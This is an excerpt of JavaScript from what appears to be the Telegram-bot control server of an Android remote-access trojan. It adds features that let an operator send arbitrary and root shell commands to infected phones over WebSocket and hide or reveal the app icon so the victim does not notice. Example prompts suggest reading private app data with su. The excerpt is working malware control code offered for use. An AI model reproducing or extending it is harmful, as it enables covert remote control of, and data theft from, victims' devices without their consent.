...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        // ==================== NEW: SHELL COMMAND REPLY HANDLER ====================
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙝𝙚𝙡𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚')) {
            const shellCommand = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`shell:${shellCommand}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
        ...
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙝𝙚𝙡𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙖𝙨 𝙧𝙤𝙤𝙩')) {
            const shellCommand = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`shell_root:${shellCommand}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
...
appBot.on("callback_query", (callbackQuery) => {
        ...
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    // ==================== NEW BUTTONS (SHELL & HIDE) ====================
                    [
                        {
                            text: '💻 𝙎𝙝𝙚𝙡𝙡 𝘾𝙤𝙢𝙢𝙖𝙣𝙙',
                            callback_data: `shell:${uuid}`
                        },
                        {
                            text: '🔓 𝙍𝙤𝙤𝙩 𝙎𝙝𝙚𝙡𝙡',
                            callback_data: `shell_root:${uuid}`
                        }
                    ],
                    [
                        {
                            text: '🎭 𝙃𝙞𝙙𝙚 𝙄𝙘𝙤𝙣',
                            callback_data: `hide:${uuid}`
                        },
                        {
                            text: '👁️ 𝙎𝙝𝙤𝙬 𝙄𝙘𝙤𝙣',
                            callback_data: `show:${uuid}`
                        },
                        {
                            text: '📊 𝙄𝙘𝙤𝙣 𝙎𝙩𝙖𝙩𝙪𝙨',
                            callback_data: `iconstatus:${uuid}`
                        }
                    ]
                ]
            },
    ...
    // ==================== NEW: SHELL COMMAND CALLBACKS ====================
    if (commend == 'shell') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙝𝙚𝙡𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚\n\n' +
            '📝 𝙀𝙭𝙖𝙢𝙥𝙡𝙚𝙨:\n' +
            '• ls -la /sdcard\n' +
            '• cat /proc/version\n' +
            '• pm list packages\n' +
            '• echo "Hello"\n\n' +
            '⚠️ 𝘽𝙚 𝙘𝙖𝙧𝙚𝙛𝙪𝙡 𝙬𝙞𝙩𝙝 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙡𝙞𝙠𝙚 𝙧𝙢 -𝙧𝙛',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'shell_root') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙝𝙚𝙡𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙖𝙨 𝙧𝙤𝙤𝙩\n\n' +
            '🔓 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙨 𝙧𝙤𝙤𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '📝 𝙀𝙭𝙖𝙢𝙥𝙡𝙚𝙨:\n' +
            '• su -c "ls -la /data/data"\n' +
            '• pm list packages\n\n' +
            '⚠️ 𝙀𝙭𝙩𝙧𝙚𝙢𝙚𝙡𝙮 𝙙𝙖𝙣𝙜𝙚𝙧𝙤𝙪𝙨!',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    // ==================== NEW: HIDE/UNHIDE CALLBACKS ====================
    if (commend == 'hide') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('hide');
        ...
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝘼𝙥𝙥 𝙞𝙘𝙤𝙣 𝙝𝙞𝙙𝙚 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ᴄᴏɴꜰɪʀᴍᴀᴛɪᴏɴ ꜰʀᴏᴍ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ'
        )
    }
    if (commend == 'show') {
        appSocket.clients.forEach(function each(ws) {
        ...
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝘼𝙥𝙥 𝙞𝙘𝙤𝙣 𝙨𝙝𝙤𝙬 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ᴄᴏɴꜰɪʀᴍᴀᴛɪᴏɴ ꜰʀᴏᴍ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ'
        )
    }
    if (commend == 'iconstatus') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('iconstatus');
            }
        ...
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙞𝙘𝙤𝙣 𝙨𝙩𝙖𝙩𝙪𝙨...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ꜱᴛᴀᴛᴜꜱ ꜰʀᴏᴍ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ'
        )
    }
});
